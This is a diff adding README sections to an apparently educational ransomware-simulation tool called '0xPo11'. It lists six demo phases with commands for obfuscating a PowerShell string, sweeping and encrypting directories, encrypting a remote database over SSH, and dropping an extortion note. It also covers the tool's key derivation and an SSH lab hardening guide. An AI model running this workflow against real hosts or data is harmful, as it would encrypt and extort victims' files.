@@ -427,3 +427,127 @@ Or from the Keyconsole:
 key
 [~] user@0xPo11 $ remove
 ```
+
+## Ransomware Simulation Phases
+
+`0xPo11` is intended to make the chain visible, not merely to encrypt files. A polished presentation run follows these six phases:
+
+1. **Initial Obfuscation (Conceal intent)**  
+   ```bash
+   key cc -e -t "cmd.exe /c powershell" -k 3 + b64 -e
+   ```
+
+2. **Hash and Identify (Create IOCs)**  
+   ```bash
+   md5 -e -t "payload.exe"
+   ```
+
+3. **Directory Sweep (Broad impact)**  
+   ```bash
+   key fe -e -i ./target -k "hunter2"
+   ```
+
+4. **Remote Execution (Zero footprint)**  
+   ```bash
+   key fe -e --host deploy@10.0.0.5 -i /data/db.dump -k "hunter2" --local-out -o db.enc
+   ```
+
+5. **Extortion Artifact (Operator psychology)**  
+   ```bash
+   key fe -e -i victims.db -k "hunter2" --drop-note press --note-out NOTE.txt
+   ```
+
+6. **Detection and Recovery (Fail clean)**  
+   ```bash
+   key fe -d -i victims.db.enc -k "wrongpass"
+   key fe -d -i victims.db.enc -k "hunter2" -o victims.db.restored
+   ```
+
+Each phase can be narrated as "obfuscation, identification, impact, execution, extortion, recovery."
+
+## Key Management (`fe`)
+
+Keys are **password-derived and per-file**:
+
+- Each encryption creates a unique random `salt` and `nonce`.
+- Uses PBKDF2-HMAC-SHA256:
+  - password supplied by `-k`
+  - 200,000 iterations by default
+  - 64-byte derived material split into:
+    - encryption key
+    - separate HMAC key
+- File format:
+
+```text
+salt || nonce || ciphertext || HMAC
+```
+
+Important safety details:
+
+- `fe` stores **no key** anywhere.
+- The password must be supplied by `-k`. It can appear in shell history or process listings, so use isolated terminal history for real assessments.
+- Decryption derives the same keys from the stored salt.
+- Decryption verifies the HMAC before writing output.
+- Wrong passwords and tampered files fail cleanly.
+
+Optional ciphers requiring dependencies are separate, but core file encryption is stdlib-only.
+
+## Remote SSH Presentation Lab
+
+For public demos, prefer a disposable local target, such as `127.0.0.1:2222` from `setup_local_ssh.sh`. If a remote host is necessary, use a dedicated account and tightly scoped firewall.
+
+### Hardening checklist
+
+- Install and enable `openssh-server`.
+- Restrict SSH to a dedicated demo user.
+- Use key-based authentication only.
+- Disable password and root login.
+- Allow only your demo source IP.
+- Create a dedicated lab data directory.
+- Do not point the demo at real user files.
+
+Example:
+
+```bash
+sudo apt install openssh-server
+sudo useradd -m -s /bin/bash demo
+sudo mkdir -m 700 /home/demo/.ssh
+ssh-copy-id -i ~/.ssh/demo_ed25519.pub demo@remote.example.com
+```
+
+```bash
+sudo tee /etc/ssh/sshd_config.d/0xpo11-demo.conf <<'EOF'
+PermitRootLogin no
+PasswordAuthentication no
+KbdInteractiveAuthentication no
+PubkeyAuthentication yes
+AuthenticationMethods publickey
+AllowUsers demo
+MaxAuthTries 3
+X11Forwarding no
+AllowTcpForwarding no
+PermitTunnel no
+EOF
+sudo sshd -t
+sudo systemctl restart ssh
+```
+
+### Local client configuration
+
+```ssh
+Host 0xpo11-remote
+    HostName remote.example.com
+    User demo
+    Port 22
+    IdentityFile ~/.ssh/0xpo11_demo_ed25519
+    IdentitiesOnly yes
+    StrictHostKeyChecking accept-new
+```
+
+Then run:
+
+```bash
+key fe -e --host 0xpo11-remote -i /home/demo/0xpo11-lab/data -k "hunter2" --local-out -o ./db.enc
+```
+
+Clean up afterward by removing the demo account, key, SSH config entry, and firewall rule.
